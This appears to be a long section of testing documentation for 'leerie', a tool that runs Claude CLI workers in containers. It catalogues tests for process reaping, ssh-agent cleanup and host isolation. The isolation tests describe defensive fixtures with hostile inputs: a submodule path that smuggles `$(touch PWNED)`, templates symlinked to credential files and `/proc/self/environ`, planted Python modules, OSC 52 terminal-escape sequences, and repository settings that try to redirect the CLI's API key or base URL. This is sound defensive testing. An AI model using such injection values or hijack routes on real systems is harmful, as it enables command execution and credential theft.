The age floor is **two-tier** (DESIGN §6 *the critical tier*), so "young
PIDs are never reaped" holds only in the normal tier: below
`_PID_REAP_CRITICAL_WATER` a young orphan is protected by the 60 s floor
(`test_poll_loop_young_orphan_not_reaped`, which monkeypatches the
critical water *up* so that tier is reachable at all — the shipped
constants are equal at 0.90), and at or above it the floor drops to
`_PID_REAP_CRITICAL_AGE_SEC` (5 s) and the same orphan **is** reaped
(`test_poll_loop_young_orphan_reaped_at_critical_pressure`). The critical
tier is the fix for the measured burst case: a leak saturates `pids.max`
faster than the 60 s floor lets anything become eligible, so the reaper
armed, found an empty candidate list, and watched the worker die (run
879defae, wave 2). Reverting the tier fails that test with
`assert 900 in []` — the empty list *is* the production bug.

Four of these tests were previously **vacuous**: they stubbed
`_cgroup_stat` with a 3-tuple while `_poll_loop` unpacks 4, so the
`ValueError` skipped the entire reaping branch and they passed against
code that never ran — including `test_poll_loop_reaps_above_high_water`,
which additionally asserted only after `stop_and_reap()` (that path
SIGKILLs `_seen` wholesale, so it passed without any mid-run reap firing).
Both traps are fixed and pinned; snapshot `killed` *before*
`stop_and_reap` in any new test here.

Zombie reaping (DESIGN §6 *Zombie reaping* — the container PID 1 is
`runuser`/idle `sleep`, not a reaping init, so orphaned git/ssh-agent
descendants would pile up as `<defunct>` against `pids.max`) is tested in
`tests/test_subreaper.py`: `_become_subreaper` is a bool-returning no-op
off Linux and (Linux-guarded) sets the flag verifiable via
`prctl(PR_GET_CHILD_SUBREAPER)`; `_zombie_reaper` (Linux-guarded) reaps an
orphaned exited child so it's no longer a zombie and survives having no
children.

The load-bearing race test is
`test_zombie_reaper_does_not_steal_unregistered_subprocess_status`: it
spawns 40 short-lived asyncio children with the reaper hot at 1ms and
**registers nothing**, asserting every child reports its true code (7),
not a fabricated 255. Registering would defeat the test's purpose — the
production failure is a pid that is unregistrable *by construction*,
sitting in the window between `fork()` and asyncio's `os.pidfd_open()`.
The old design (scan `/proc` for state==Z + ppid==getpid, minus
`_ASYNCIO_MANAGED_PIDS`) passed a test that registered the pid *before*
starting the reaper — a sequencing production never provides — while
taking `preflight`'s own `git config` pid on 40/40 real runs. Safety now
comes from `_REAPABLE_PIDS`, an allowlist populated by `_mark_reapable`.
Paired with `test_zombie_reaper_still_reaps_a_recorded_orphan` (a reaper
that reaps nothing is not a fix, it is a disabled reaper) and three
source-coupling guards: the reaper's source contains no
`/proc`/`listdir`/`_orphan_zombie_children` (docstring stripped via `ast`
first, since it *describes* the forbidden scan), `_DescendantTracker._poll_loop`
calls `_mark_reapable` (the fix is inert without the wiring), and
`_mark_reapable` never admits an `_ASYNCIO_MANAGED_PIDS` member; plus a
`_reparented_orphans`-accepts-`ppid==getpid` test, and source-coupling
guards that `main()` calls `_become_subreaper()` and `_orchestrate()`
spawns+cancels `_zombie_reaper`.

`_orchestrate()`'s own `finally` block (leerie:32599-32660 — cancels
`sampler_task`/`reaper_task` and, when `force_strict_output` is set, stops
`_StrictOutputProxy`) is bounded end-to-end in
`tests/test_orchestrate_cleanup_bound.py`: `_memory_sampler`/`_zombie_reaper`
are replaced with a `while True: await asyncio.sleep(9999)` double so only
prompt cancellation (not a short default `interval_sec`) lets
`asyncio.run(_orchestrate(...))` return, across all 4 combinations of
`_run_phases` returning normally vs. raising `WorkerError`, and plain vs.
`force_strict_output=True` (which additionally asserts `_STRICT_PROXY` is
cleared). The wall-clock ceiling is backstopped by a `SIGALRM`-based hard
timeout rather than `asyncio.wait_for`, since `wait_for`'s own cancellation
lands inside the same `contextlib.suppress(asyncio.CancelledError)` the
regression class already defeats and would hang right along with it. An
`entered` list asserts each double actually reached its sleep before being
cancelled, so a double cancelled pre-schedule can't pass the test
vacuously.

## PENDING_ISSUES.md follow-up surfaces

Three further surfaces arrived with the `PENDING_ISSUES.md` work order,
catalogued here because their traps are not obvious from the test names.

`tests/test_duplicate_provider_merge_routing.py` (7 tests) pins that
`check_duplicate_providers`' detections are routed into a **merge**
resolution and never a drop — the transitive `survivor_of` chase is safe
for a merge (intent carries forward) and silently destroys a live subtask
for a drop, which is the hazard `_apply_multidrop` documents above. The
floor had been advisory only: measured across the run corpus, **4 of 5
runs where it fired applied zero resolutions**, one of them with 35
detections and no action.

`tests/test_recursive_decompose_parallel.py` (4 tests) pins that
`phase_plan`'s expansion loop — previously a plain sequential `await`,
measured at ~0.7x parallelism — now bounds concurrency with the
**existing** `_gather_or_cancel` while preserving `decompose_snapshot`'s
per-completion write, including the `list(leaves)` copy that keeps a
later crash from mutating an already-taken snapshot (the aliasing class
`test_checkpoint_aliasing.py` exists for).

`tests/test_require_fly_ssh_isolation.py` (10 tests) pins
`_leerie_fly_agent_ensure`'s reuse predicate, whose exit codes are the
whole point: `ssh-add -l` returns **1** for a reachable-but-keyless agent,
**0** with a key, **2** for a dead socket (verified live). Treating rc 1
like rc 2 `rm -f`s a live agent's socket out from under it, orphaning the
process — which is the leak. The `-t 24h` on spawn bounds the
**identities**, not the agent process, so it is not an orphan mitigation;
see `scripts/remote/lib.sh`'s comment. Two of them run the function under
the launcher's own `set` line (read from `leerie`): a real keyless agent
(`ssh-add -l` rc 1) is reused and the caller continues — a bare `ssh-add -l`
under `set -e` had ended the launcher there silently, leaking
`.spawn.lock` (review r25 M1), while the older tests, which run without
`set -e`, stayed green — and a failed `ssh-agent` spawn returns with a message and no lock.
Its per-test HOME fixture stops that test's agents by PID
(`tests/conftest.py::stop_ssh_agents_under`), not by `pkill -f`.

**No ssh-agent outlives the session.** The Fly seed reaches
`require_fly_ssh`, whose spawn starts leerie's private agent under
`${XDG_CACHE_HOME:-$HOME/.cache}/leerie/agent/`; it daemonizes, and under
the session HOME
nothing stopped it, so `tests/test_re_seed.py`, `tests/test_seed_repo_sh.py`,
`tests/test_seed_inspect_dirs.py` and the seed tests importing their stubs
leaked one agent per pytest session, on CI too. Their seeding subject does
not need the agent: each stub `flyctl` writer also puts a no-op `ssh-agent`
beside it (`tests/stub_helpers.py::_make_stub_ssh_agent`). The controlling
pytest process's `pytest_sessionfinish` (`tests/conftest.py`) fails the
session when any `ssh-agent` whose argv names the agent directory the
product derives (`leerie_agent_dir()`) or the session's base temp
directory (where a test's own `XDG_CACHE_HOME` puts it) is still alive,
and stops it by PID either way. Falsified: with `_make_stub_ssh_agent` writing no stub,
`tests/test_re_seed.py` alone exits 1 naming the agent, and none survives.
The session's `XDG_CACHE_HOME`, `XDG_CONFIG_HOME`, `XDG_DATA_HOME` and
`XDG_STATE_HOME` are set under its HOME, and `_home_is_never_the_users`
fails a test that points one at the user's own home or at the value
inherited from the user's environment (a test's own `tmp_path` is fine):
with an `XDG_CACHE_HOME` inherited from outside, the agent lived beyond the HOME, a leaking session passed and its
agent survived (review round 29 isolation F3).
`tests/test_session_agent_guard.py` (1 test) runs a child session given an
outside `XDG_CACHE_HOME` that starts the agent and does not stop it: the
session fails, the agent was under the child's HOME, and none survives.
Falsified: with the conftest before this, the agent's socket is under the
outside directory and the test fails.

**No test writes the user's real `~/.leerie`.** The same hook fails the
session when the user's real `~/.leerie` (`REAL_HOME`) gains a top-level
entry during it: names are listed at conftest's first import and compared at
the end, read only, nothing removed. Empty `logs/` directories under names
such as `ci-old` and `sub` had been found there. `tests/test_session_real_home_guard.py`
(4 tests) runs a child session whose user's home is scratch: one that writes
`~/.leerie/ci-old/logs` there fails naming it and leaves it in place, one
that writes nothing passes. Falsified: with the comparison disabled, the
first test fails. The per-test check refuses an XDG directory at the user's
home and accepts one beneath `tmp_path`; and the session's own temp root is
never the user's place, so with a TMPDIR beneath the user's home the
session HOME and a test's `tmp_path` there are accepted.

`tests/test_resume_push_writes_pr.py` (4 tests) drives the real
`_run_phases` resume of a finished run with only `claude_p` stubbed: a resume
continuing with a push and no `run.json.pr_title` runs `pr_writer` and records
its title (review r25 L1: `resume <id> --push` of a finished `--no-push` run
pushed with the fallback body); a resume continuing without a push, or of a
run whose PR is written, runs no worker; nor does a resume of a run the host
already pushed (`pushed_at` and `pr_url` set, no `pr_title`: its `pr_writer`
failed at finalize and its PR is open with the fallback body; review round
26, I1). Dropping the `pushed_at` check turns that last test red.

`tests/test_leerie_python_is_named.py` (7 tests; DESIGN §6 *Leerie names its
own Python by path*). Measured in `leerie:0.44.1`, a checkout's
`.python-version` chose, through mise's shim, the interpreter of the cgroup
broker and the orchestrator (`container-entry.sh` runs them from `/work`),
and made root install CPython 3.11.18 from the network. A rule over the
entry script's command lines, `collect-subtrees.sh`'s machine payload, the
Fly/EC2 launch wrapper as `seed-common.sh` renders it (AST), and every
subprocess or `exec` call in leerie's own Python (AST) fails a Python
interpreter started by a bare name; the entry test also asserts both
privilege-drop arms exec `/usr/bin/python3` for the broker and the
orchestrator. Two controls prove each scan can fail. Reverting any one of
the three fixed files turns its test red.

`tests/test_host_python_is_isolated.py` (29 tests: 23 functions, two of
them run four times each, over where the operator's `tenacity` is; DESIGN §6
*The host never imports the repository's code* and *The host never runs a
program the checkout chose*, review round 25 I1, round 26 F1 and I2, round
27 isolation I2). A rule over every host-run shell file (the launcher,
`host-finalize.sh`, `install.sh`, `runtime-install.sh`, `scripts/remote/`)
fails any `python3` invocation without `-I`; an anti-vacuity test checks the
scan sees the known calls, and a planted unisolated call proves it can fail.
The reviewer's proof, inverted: the bare-resume pick seam, the
`config --recapture` seam and the launcher's real `NO_PUSH` block run from a
checkout holding planted stdlib-named modules, never run them, and still do
their job. The rebaser seam (as `host-finalize.sh` writes it) and the
recapture seam run from a checkout holding a planted `tenacity.py`, with the
operator's `tenacity` behind a relative `PYTHONPATH` entry, in the user
site, or behind an absolute `PYTHONPATH` entry into the checkout, and must
import the operator's; with only a user-site `.pth` naming the checkout
(an editable install), the interpreter's or none
(`admit_operator_import_paths(exclude)`). The chain synth-merge helper,
given `.`, the checkout itself and an absolute operator entry on
`PYTHONPATH`, imports the operator's `chain.git_ops` and not the
checkout's.

The same file pins that no program the launcher starts runs in the
checkout (round 26 I2). Shims built from shell builtins and absolute paths
stand in front of a bounded list of 29 names, asdf-shaped: each records its
working directory and execs the real program found before the shim
directory went on `PATH`, so none can start another. The launcher's
host-only verbs, run from a checkout whose `.tool-versions` names its own
`python3`, start no shim inside it and never run the plant, and a
`.tool-versions` cannot pick the launcher's own `python3`. The prologue's
shape (`/bin/sh`, `cd /` before `bash` is chosen) is checked, a relative
`--state-dir` and task file still mean the checkout's (the state dir beside
it, since one inside is refused), and `ls-remote` starts `ssh` from `/`,
with a `git -C` control that starts it in the checkout. Static rules reject
a `cd` into the checkout in the host scripts and a `git submodule foreach`
body that runs more than `printf`, require every remote git call in
`host-finalize.sh` and the launcher to go through `_repo_git_from_root` or
`_repo_git_push`, and chain's git runs from `/` naming the repository.

Falsified on the current tree: dropping `-I` from the recapture seam, the
bare-resume seam and the `NO_PUSH` record read turns 8 tests red (the rule,
the three seam tests and the four recapture `tenacity` cases); replacing
both seams' `admit_operator_import_paths(...)` call with `pass` turns 6 red
(every rebaser and recapture case but the two `.pth` ones, which import no
plant either way); replacing only the final drop with a no-op turns the 4
`*_into_checkout` cases red.

`tests/test_leerie_reads_never_follow_links.py` (23 tests: 20 functions;
the credentials test runs twice, the `.claude` settings test three times,
and `test_environ_child` is the `/proc/self/environ` child, skipped unless
its parent runs it; DESIGN §6 *Leerie never reads through a link a
repository holds*, review round 26 I1, round 27 isolation I3 and execution
L2). The primitives refuse a link at the file or on the way, and a listing
keeps only what it reached without one. The reviewer's proof, inverted: a
PR template linked to a credentials file or to `/proc/self/environ` reaches
no `pr_writer` payload, while the committed template does, and a link in
the multi-template directory is not a template. Configuration, the inputs
handed to workers, task references and the task file, a checkpoint named
outside its notes directory and the repository's `.claude` settings are
read never through a link, and a FIFO in a tree repository never blocks the
orchestrator. The launcher refuses a linked `.claude`,
`.claude/settings.json` or `.claude/settings.local.json` (a regular file
passes). No read is unbounded: a 1 TiB sparse checkpoint gets the gate's
error string, `_read_file_safely` of a 1 TiB sparse file returns its
budget, the limit is exact, and a rule requires `limit=` on every reader
call and anchored copy. The rule over the module: every function calling a
raw read primitive is classified (87 names: 58 leerie's own, 10 the
kernel's, 5 the operator's, 10 listings that follow no link, 4 primitives),
and the 39 converted functions call none and decide what to read with no
probe that follows a link (`.is_file()`, `.is_dir()`, `.exists()`,
`os.path.*`, a copy without `src_anchor=`), but for three whose probes only
test existence. Without that second part three converted functions
(`_existing_mise_toml_path`, `_stage_worktree_extras`,
`_copy_task_references`) could revert and stay green (round 27 claims C9);
reverting `_copy_task_references`' anchored copy, or
`_existing_mise_toml_path`'s `_regular_file_beneath`, now turns it red.

Review round 27's host findings (DESIGN §6 *The host never runs a program
the checkout chose*), each proof inverted and live-falsified:
- `tests/test_host_worker_starts_outside_the_tree.py` (4 tests, I1): the real
  `run_rebaser` with an asdf-shaped `claude` shim of builtins and a plant in
  the run branch never runs the plant, starts the CLI outside the worktree
  with `--add-dir <worktree>` and removes its start directory; the prompt
  names the worktree; `_exe_from_root` anchors relative PATH entries at `/`;
  `_host_worker_cwd` refuses a temporary directory inside a tree.
- `tests/test_host_python_is_isolated.py`, 5 of its 29 tests: `config --chat`
  starts its CLI outside the checkout, never through a relative PATH entry
  (I1); every host `fetch` and `pull` carries `--no-recurse-submodules` (a
  rule, its anti-vacuity check and a planted control), and the shipped
  scratch-ref fetch of a commit moving a gitlink starts no `ssh` (I5).
- `tests/test_host_push_starts_only_the_hook_in_the_checkout.py` (7 tests,
  I5): a hooked push starts `ssh` in `/` (the `-C` control starts it in the
  checkout); the operator's hook starts at the top of the work tree with
  git's arguments, its ref lines on stdin and the operator's
  `GIT_CONFIG_PARAMETERS`, still vetoes the push, honours a relative
  `core.hooksPath`, and `--no-verify` still skips it.
- `tests/test_seed_submodule_list_is_nul_delimited.py` (4 tests, I4): a
  submodule path holding a newline and a tab lists no host repository in any
  of the three shipped loops (the line-based control lists it); every bundle
  name is hex, a `'` never reaches the remote shell, and the host and
  machine sides name a bundle the same.
- `tests/test_seed_machine_submodules.py` (5 tests, review r28 exec L2):
  the Fly seed, the Fly inspect-dir seed and the EC2 seed each run their
  real machine script locally, through the existing transport stubs, on a
  checkout holding `libs/we ird<TAB>$(touch PWNED)'q"`, a plain path and a
  submodule with a nested one, with every submodule's own URL deleted
  first. Every submodule, the nested one included, is checked out at the
  host's commit and nothing named `PWNED` appears; a submodule without a
  bundle stays uninitialised; all three scripts embed
  `_seed_machine_submodules`. Falsified: with the old machine scripts 4 of
  the 5 are red (all three seeds exit non-zero, the EC2 one naming the
  deleted URLs it tried to clone, and the shared-snippet pin). Writing it found the
  Fly stub `flyctl` in `tests/test_seed_repo_sh.py` saving each submodule
  bundle with the closing `'` of `sh -c 'cat > …'` in its name, which the
  old machine script hid by cloning the still-reachable source URL.
- `tests/test_host_reads_name_the_checkout.py` (8 tests, exec M1, L1, L3):
  run from `/` with the identity only in the repository, Fly's `seed_auth`
  and EC2's `ec2_seed_auth` ship the repository's identity; a rule forbids a
  host file taking the checkout from its working directory, and every host
  seam that loads the orchestrator is given `USER_REPO`; a seam's log lines
  carry the checkout's name; the launcher refuses a deleted working
  directory. Falsified: reverting the identity reads, one seam's
  `USER_REPO` and the prologue's empty check turns 6 of the 8 red.

`tests/test_repo_config_names_no_location.py` (25 tests: 12 functions;
DESIGN §6 *No host path comes from a repository*, review round 27 isolation
I6). The real launcher, started in a checkout whose `leerie.toml` sets
`log_file`, `state_dir`, `inspect_dirs`, `judge_dir` or `heal_dir`, exits 1
naming each key and its operator-side replacement, and creates neither
`~/.bashrc` nor a state root; a file with only other keys, or a
commented-out key, passes. The reviewer's harness (the resolution block
from `_state_dir_default` through `export LEERIE_LOG_FILE_RESOLVED`, plus
the tee-target check) resolves the default state root and log for a
checkout naming `~/.bashrc` and `.lstate`. The launcher refuses a state root
equal to, inside or above the checkout from the environment and the flag, a
relative one anchored inside it, and a link into it (by real path); a
sibling whose name starts with the checkout's passes. The launcher's key
list is `REPO_CONFIG_OPERATOR_KEYS` (the locations first), `_read_toml_key`
raises for each location key, and neither the orchestrator nor the launcher
spells a read of any operator key.
Falsified: disabling the launcher's refusal turns the 6 key tests red;
making `_state_root_overlaps_checkout` print nothing turns the 8 overlap
tests red; dropping `_read_toml_key`'s guard turns its 5 cases red.

`tests/test_repo_config_chooses_no_authority.py` (17 test functions, 86
cases; DESIGN §6 *A
repository chooses no operator authority*). The real launcher, started on a
fresh run (`--no-push "fix the bug"`) from a checkout whose `leerie.toml`
sets any one of the 25 `REPO_CONFIG_AUTHORITY_KEYS` (`runtime`, the AWS and
`ec2_*` keys, `fly_disk_gb`, `dangerously_*`, the gate `skip_*` keys,
`worker_memory_max`, `worker_pids_max`), exits 1 naming the key with its flag
and env var, runs none of the shimmed `aws`, `flyctl`, `fly`, `nerdctl`,
`ssh`, and creates no state root; repository facts (`effort_*`, `model`,
`max_workers`, `no_push`, `strict_conformer`, `skip_repo_map`, `seed_depth`)
pass. `_read_toml_key` raises for each authority key; every waiver resolver
ignores `<key> = true` in the file and still honours its env var;
`resolve_runtime`, `resolve_worker_pids_max` and `resolve_worker_memory_max`
ignore the file. A checkout settings file git tracks adds nothing to
`_confined_cli_settings` (no `apiKeyHelper`, `permissions` or
`ANTHROPIC_BASE_URL`; logged) while an untracked one does, and a checkout
git cannot read counts as tracked; the launcher's own
`_checkout_file_tracked` / `_operator_claude_settings` /
`detect_bedrock_mode` (extracted by `tests/bedrock_extract.py`) do not enter
Bedrock mode from a tracked `settings.json` or `settings.local.json` and
warn naming the keys, while an untracked one and `~/.claude/settings.json`
still do. Falsified: dropping `runtime` and `skip_acceptance_check` from the
launcher's list turns 4 red (with the list-equality test in
`test_repo_config_names_no_location.py`); giving
`resolve_skip_acceptance_check` its file tier back turns 1 red; treating every
checkout settings file as the operator's in the orchestrator turns 2 red, and
in the launcher 2 red. The Bedrock tests (`test_bedrock_mode.py`), the
settings-layer tests (`test_worker_commands_cannot_reach_the_cli.py`) and
the resolver tests that used to pin a `leerie.toml` tier for these keys now
make their checkout a git repository whose settings are untracked, or
assert the file is never read.
Review round 31 S1 (11 cases): a checkout cloned with
`--recurse-submodules` whose `.claude` is a submodule, and one with a
repository cloned into `.claude` that the superproject's index does not
record, each with both settings files: neither file is a worker's settings
layer (`_checkout_settings_are_operators`, via `_checkout_file_tracked`) or
chooses Bedrock (the launcher's `_checkout_file_tracked`), though the
superproject's `ls-files` names neither; the operator's untracked
`.claude/settings.local.json` beside a submodule elsewhere still does both
(control); and a report the task names inside such a directory is not
inlined (`_d1_report_sources`) while the operator's own untracked report
is. `tests/test_launcher_per_repo_image.py::test_a_submodules_generated_dockerfile_is_not_overwritten`
covers the same rule at the launcher's `.leerie/Dockerfile` refresh, and
`tests/test_requirement_coverage.py`'s phase test makes its checkout a git
repository (a report is inlined only when git says no repository holds
it). Falsified against the code before the fix (the tests kept): all 11
S1 cases and the Dockerfile case fail, the control through the extracted
launcher block, which the fix renamed (`tests/bedrock_extract.py` now
extracts `_checkout_file_tracked` from before the Dockerfile refresh, where
it is defined, and `_operator_claude_settings` onward).

`tests/test_a_path_is_the_file_not_its_spelling.py` (11 test functions;
DESIGN §6 *A path is the file it names, not its spelling*; review round 28
isolation A1): a hard link standing in for a case-insensitive alias — a
tracked `.claude/settings.json` reached by another spelling is the
operator's (`_checkout_settings_are_operators`, `_checkout_file_tracked`,
`_index_holds`; the launcher's `_checkout_file_tracked`, exit 3 only for
untracked),
protected paths compare folded (`_path_fold`), path lists are read with
`-z`, and `check_diff_scope` refuses a second spelling
(`_fold_collisions`). 16 cases fail against the parent.

`tests/test_host_cli_loads_nothing_from_the_tree.py` (4 test functions, 6
cases; DESIGN §6 *The host never runs a program the checkout chose*, part 4;
review round 28 isolation C1, C2): the real `run_rebaser` (`_invoke`
captured) and the launcher's `config --chat` (builtins-only stub `claude`)
pass `--setting-sources user`, `--disable-slash-commands`,
`--strict-mcp-config`, deny Agent/Task/Skill, pin
`CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=0` in the environment and the
`--settings` env, and put `--` before the first message. All 6 fail with
the wiring removed.

`tests/test_terminal_text.py` (18 test functions, 21 cases; DESIGN §6 *No
text leerie did not
write reaches the operator's terminal as a control sequence*; review round
30 isolation T1), with an OSC 52 sequence, a CSI, a C1 CSI, a bidi
override, U+2028, BEL and CR: `_terminal_text` escapes each, keeps newline
and tab, and is idempotent; `scripts/terminal-text.py` is the same rule
over U+0000–U+2FFF and surrogates, and relays bytes fed one at a time (a
split UTF-8 character, a byte that is not UTF-8); `log()` and `die()`; a
worker's JSON string printed through `main()`'s guarded `sys.stdout`; the
run log's tee, both copies; a repository-image file name through
`_require_worker_view`'s `die`; the real launcher, piped, relaying a stub
container's output; and the launcher's, `lib.sh`'s and `ec2-ssm.sh`'s
relays naming `_terminal_relay`. All 9 fail without the change; the
launcher test fails with only the relay taken out of the piped branch.
Review round 31 (T2, execution F1, F2, F4) added 4 functions, 6 cases, each
with a producer of shell builtins printing the sequences: `build_repo_image`
with a `nerdctl` that prints on stdout and stderr and exits 0 or 1 (both
streams escaped; the build's own status still decides), `_fly_push` with a
`build-push.sh` doing the same (the digest taken on 0, nothing on 1), the
real launcher's `leerie config` over a `.leerie/config.toml` and a
`leerie.toml` holding them, and `host_prepush_preflight` with a real
pre-push hook printing them. `tests/test_host_finalize_sh.py` (2 more, 38
functions, 40 cases) drives `host_finalize`: a failed push's hook output
and a repository's `pr_base_branch` holding U+202E, and an unusable
rebaser payload, reach stderr escaped. Falsified against the code before
the fix: all 8 cases fail. Since the repository image is two builds
(DESIGN §6 *One image, two roots*) the `build_repo_image` case has a third
value, leerie's build failing after the repository's succeeded (falsified:
with that build's status check removed it fails). Harnesses that run an extracted launcher block
now source the real `scripts/remote/_log.sh` (`tests/conftest.py`'s
`LOG_SH_SOURCE`, before their own `remote_log` stub: `test_build_repo_image`,
`test_dockerfile_autogen`, `test_dockerfile_bake_from_capture`,
`test_ensure_image`, `test_fly_per_repo_image`,
`test_launcher_per_repo_image`, `test_config_verb`, `test_capture_validation`;
`tests/log_file_extract_helpers.py`'s `extract_terminal_relay` sources it
too, since the relay finds `terminal-text.py` beside `_log.sh`); the
`nerdctl` stub (`tests/repo_image_block_extract.py`) records a build in a
file, since the build now runs in a pipeline; and the `python3` stubs that
stand in for the rebaser seam (`tests/test_host_finalize_sh.py`,
`tests/test_host_finalize_rebase.py`) hand the terminal filter to
`/usr/bin/python3` by absolute path — one of them ended in `exec
/usr/bin/env python3`, which found the stub again and looped once the
filter called `python3`.
The colour rule (a complete CSI dropped, everything else escaped; the
user's 0.44.0 vitest output, 2026-11-03) added 5 functions: the run's
vitest lines come out plain from both implementations; OSC 52, OSC 8,
DCS, a lone ESC, a CSI cut by a control or by the end, the C1 CSI and a
bidi override stay escaped while SGR, cursor moves, erases, private modes
and report requests are dropped; a removal never joins a new sequence; the
two implementations agree on that corpus; and the relay's `main()`, fed
one byte per read (its module's `os` replaced, so every sequence is split),
emits the rule applied to the whole stream. Falsified: with both
implementations reverted 4 fail (the agreement case passes, both sides
escaping alike); with only the relay's hold-back removed, the split-read
case.

Review round 32. `tests/test_confined_terminal.py` (11 test functions, 17
cases; DESIGN §6 *No confined process holds or can open the operator's
terminal*, isolation P1 and round 33's Q1) hands the real shim a real pty whose master holds
a typed line, and a probe that writes OSC 52 to fd 0, reads fd 0 and opens
`/dev/tty`: a pty on stdin becomes `/dev/null` and nothing reaches the
master or is read from it (plain and `--isolate`); a pty on fd 1, fd 2 or
another passed fd exits 126 without running the command (3 cases); a shim
started inside a session whose controlling terminal is the pty (as
`_ts_script_run` starts it) cannot open `/dev/tty` (plain and `--isolate`);
a shim leading a session that has one exits 126; and `_run_streaming`,
`run_proc` and `_ts_script_run`, with the shim taken out, give the command
`/dev/null` while the test process's fd 0 is a pty. The `--isolate` cases
skip on a host that cannot build a sandbox; run in the `leerie:0.43.0`
image (the test file under a stub `pytest`), both pass, and with
`leave_terminal()` taken out the stdin case reads the typed line from
`/dev/pts/0`. Falsified on the host: with `leave_terminal()` taken out the
6 plain shim cases fail; with the spawners' `stdin=DEVNULL` taken out the 3
spawner cases fail; all 9 fail against the parent. Round 33 (Q1: under
`nerdctl run -it` the operator's pty is `/dev/console`, which every grant
read) added 4 functions, 6 cases: with the real shim, the real
`_WORKER_DEVICES` and the real `_reads_outside`, the test's pty (by its
`/dev/pts/<n>` name) and `/dev/console` do not open, and null, zero,
random, urandom and full still work (plain and `--isolate`); no read grant
`_reads_outside` makes resolves into `/dev`, and `_WORKER_DEVICES` is
exactly the seven nodes; the confined shim exits 126 without running the
command when its `CONSOLE` (pointed at the test's pty) opens under a grant
of `/` and `/dev/pts`, and runs under leerie's grants; and an isolated
process's `/dev`, under a grant of `/`, lists exactly the six nodes, the
five links, `pts` and `shm`, its `pts` only `ptmx`, and a pty opens as
`/dev/pts/0`. `_shim_argv` now reads every top-level entry but `/dev` and
`/tmp`, as leerie's grants do. On the host (no user namespaces) 4 fail
against the parent: the plain pty case (the typed line read, its echo
turned off), the console check (the command ran), `/dev` in the reads, and
the AppArmor rule. In the `leerie:0.43.0` image under `nerdctl run -it` and
the rootless drop all 17 run, and against the parent 5 fail: those three
of `test_confined_terminal.py`, plus the isolated pty case (`/dev/console`
opened and its echo turned off) and the isolated `/dev` (it lists
`console`, `core` and `mqueue`). In `tests/test_launcher_secopt.py` (13
functions, 13 cases)
`test_profile_allows_exactly_the_shims_mounts` pins the private `/dev`'s
tmpfs rule, and `test_profile_keeps_every_rule_a_released_shim_needs` pins
0.43.0's allow rules (DESIGN §6 *The profile only grows*): the private
`/dev` no longer binds `/dev/pts/ptmx` over `/dev/ptmx`, but a 0.43.0
container still running when the profile is reloaded does, so that rule
stays; with it deleted the test fails.
`tests/test_terminal_safe_messages.py` (4 functions, 4 cases; execution
X3) is the static rule by source: every message in the launcher,
`scripts/host-finalize.sh` and `scripts/remote/*.sh` that expands
a variable read from `leerie.toml`, `.leerie/config.toml`, `run.json` or a
git command printing names or text does so inside `_terminal_safe` or on a
`_terminal_relay` line; every script sourcing `_log.sh` is scanned; and the
rule finds 4 raw synthetic shapes (in place, through a path variable,
through a reading function, propagated from git text) and passes 4 safe
ones (escaped, relayed, a count and an object id, never printed). It found
88 raw messages on the parent; with either seed-knob message unwrapped it
fails. `tests/test_launcher_seed_depth_resolution.py`'s
`test_a_committed_value_reaches_the_terminal_escaped` (1 function, 2
cases; the file has 12 functions, 18 cases) runs the
launcher's seed-knob block over a committed OSC 52 value; both fail
against the parent. `tests/test_group_launcher_verbs.py`'s
`TestStoredTextIsEscaped` (4 functions, 4 cases; the file has 31
functions, 31 cases; isolation P2) puts a hook's OSC 52
in `push_error` and `started_at` and runs the real launcher's `status
<group-id>`, `status <chain-id>`, `list --groups` and `list chains`: no
control byte reaches stdout or stderr, and the escaped form is in the
table. All 4 fail with the cell filter taken out.

`tests/test_state_root_apart.py` (10 tests; part 3 of the same section).
`_require_state_root_apart` over a planted `/proc/self/mountinfo`: a state
root bind-mounted from inside the checkout, one holding the checkout, and
the same directory under two mounts stop the run (the first also shows the
reviewer's mechanism, `_around(["/work"], Path("/leerie-state"))` keeping
`/work` whole); the default sibling layout, a prefix-sharing name and
another device pass; octal escapes are decoded and the mount on top wins.
On the real mounts, a state root nested by path (the direct-call default)
and two separate directories pass. Falsified: never stopping turns the 4
stopping tests red.

## fetch_branch, config, and group verbs

The `fetch_branch()` stream-back surface (`scripts/remote/fetch-branch.sh`)
is tested across two files. `tests/test_fetch_branch_sh.py` covers run
discovery, bundle fetch, run-state tar (`run.json`, its `no_push` included,
arrives unchanged), and baseline Step
4 (nothing streamed from the machine's `/work/.leerie/`, an existing host
file never clobbered, non-fatal on absent machine files, no Dockerfile
written under `LEERIE_STATE_HOST_DIR`) via bash-harness subprocess tests
with a stubbed `flyctl`. The expanded Step 4 contracts are covered by
`tests/test_fetch_branch_leerie_streamback.py` (imports stub helpers from
`test_fetch_branch_sh` to avoid duplication): the run's recorded capture
(`captured-deps.json`, home with the run directory) is named, with
`leerie config --apply-capture <run-id>`, and nothing is applied; a
hand-edited config is left as it is; no machine `Dockerfile` or
`config.toml` is streamed, and an existing host Dockerfile is never
clobbered; non-fatal when nothing is there; `LEERIE_STATE_HOST_DIR` takes
the run directory and nothing else (DESIGN §6½ *The operator applies a
capture*).

The `leerie config` verb (all four sub-modes: `--init`, bare, `--chat`,
`--recapture`) is tested in `tests/test_config_verb.py` via a
self-contained bash harness with stubbed `nerdctl` and `claude`, plus a
parity guard that extracts the real launcher `config)` case arm and diffs
its BLT inference against `_infer_build_lint_test()` across a fixture
matrix so the two can never silently diverge.

The `group` launcher arm and group-scoped ID-dispatched verbs are tested
in `tests/test_group_launcher.py` via the same bash-harness pattern
(stubbed `./leerie`, multi-state-dir fixtures), modeled on
`tests/test_chain_launcher_id_dispatch.py`. Group-scoped verb dispatch
across two state dirs (combined paused/unpushed + pushed fixture, plus
`stop` dispatch) is covered by `tests/test_group_launcher_verbs.py`.
Fan-out core contract (cwd per member, `--inspect-dir` for siblings, brief
prepend) is in `tests/test_group_launcher_fanout.py`.
`TestGroupFanOut::test_only_this_groups_runs_are_tagged` puts another
group's runs and standalone runs, all finished and newer, beside each
member's own run, and asserts that only the runs the members started carry
the group's id and appear in its `status` (DESIGN §6 *Which run the
container ran*). Its stub writes `group_id` at run start, as a member's
orchestrator does. With the old newest-finished scan put back, the
standalone runs get the group's id and the test fails. Python-layer
`group_id` in `run.json` (`_validate_run_json`, `_write_run_json`,
`_derive_run_status`) is in `tests/test_group_run_json.py`. State-dir
isolation (distinct basename-keyed dirs per member, guard rejects
`LEERIE_STATE_DIR`/`--state-dir`) is in
`tests/test_group_state_dir_guard.py`. That file's class-A harness
